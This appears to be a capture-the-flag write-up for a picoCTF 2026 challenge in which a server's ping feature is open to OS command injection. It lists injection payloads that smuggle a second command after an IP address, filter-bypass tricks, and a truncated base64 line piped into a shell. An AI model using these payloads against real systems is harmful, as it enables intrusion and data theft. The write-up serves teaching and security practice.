# ping-cmd - picoCTF 2026

**Category:** General Skills
**Points:** 100

## Challenge Description
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with the input?

## Approach

This is a classic **OS command injection** challenge. The server takes user input (an IP address) and passes it to the `ping` command. If the input is not properly sanitized, an attacker can inject additional shell commands.

### How command injection works

When a web application or server-side script does something like:

```python
os.system("ping -c 1 " + user_input)
```

or in bash:

```bash
ping -c 1 $USER_INPUT
```

An attacker can provide input like:

```
8.8.8.8; cat /flag.txt
```

The shell interprets this as two separate commands:
1. `ping -c 1 8.8.8.8` (legitimate ping)
2. `cat /flag.txt` (attacker's injected command)

### Common command injection operators

| Operator | Description | Example |
|----------|-------------|---------|
| `;` | Command separator | `8.8.8.8; cat /flag.txt` |
| `&&` | AND -- second runs if first succeeds | `8.8.8.8 && cat /flag.txt` |
| `\|\|` | OR -- second runs if first fails | `invalid \|\| cat /flag.txt` |
| `` ` `` | Command substitution (backticks) | `` 8.8.8.8 `cat /flag.txt` `` |
| `$()` | Command substitution | `8.8.8.8 $(cat /flag.txt)` |
| `\|` | Pipe | `8.8.8.8 \| cat /flag.txt` |
| `\n` | Newline (URL-encoded: %0a) | `8.8.8.8%0acat /flag.txt` |

### If basic characters are filtered

Some challenges filter `;`, `&`, and `|`. Bypass techniques include:
- **Newline injection**: `%0a` in URL-encoded input
- **Brace expansion**: `{cat,/flag.txt}` instead of `cat /flag.txt`
- **Variable tricks**: `c''at /flag.txt` or `c\at /flag.txt`
- **Base64 encoding**: `echo YmFzaCAtaSA...| base64 -d | sh`

## Solution

### Step 1: Identify the injection point

The server has an input field or parameter where you enter an IP address to ping. This could be:
- A web form (POST parameter)
- A URL query parameter
- A command-line prompt (netcat/SSH)

### Step 2: Test for command injection

Try the simplest injection first:

```
8.8.8.8; id
```

If you see output from the `id` command (e.g., `uid=1000(ctf)...`), injection works.

### Step 3: Find the flag

```
8.8.8.8; ls /
```

This lists the root directory. Look for `flag.txt` or similar files.

### Step 4: Read the flag

```
8.8.8.8; cat /flag.txt
```

### If semicolons are filtered, try alternatives:

```
8.8.8.8 && cat /flag.txt
8.8.8.8 | cat /flag.txt
8.8.8.8 || cat /flag.txt
```

### For web-based challenges:

The input might be submitted via a web form. In that case, use the browser, curl, or the solve script to send the crafted input.

## Solution Script
```
python3 solve.py
```

## Flag
```
picoCTF{...}  (placeholder - actual flag varies per instance)
```
